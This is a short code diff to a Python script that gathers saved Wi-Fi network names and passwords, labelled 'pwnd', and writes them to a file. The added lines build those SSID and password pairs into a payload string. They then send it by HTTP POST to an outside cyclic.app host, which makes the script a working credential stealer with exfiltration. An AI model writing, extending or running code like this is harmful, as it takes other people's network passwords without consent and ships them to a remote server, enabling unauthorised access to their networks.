@@ -39,3 +39,9 @@ f = open(file, 'x')
 for pwnd_ssid in pwnd:
     f.write("[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) )
 f.close()
+
+final_payload = ""
+for pwnd_ssid in pwnd:
+    final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
+
+r = requests.post("https://kind-teal-salmon-cape.cyclic.app/", params="format=json", data=final_payload)
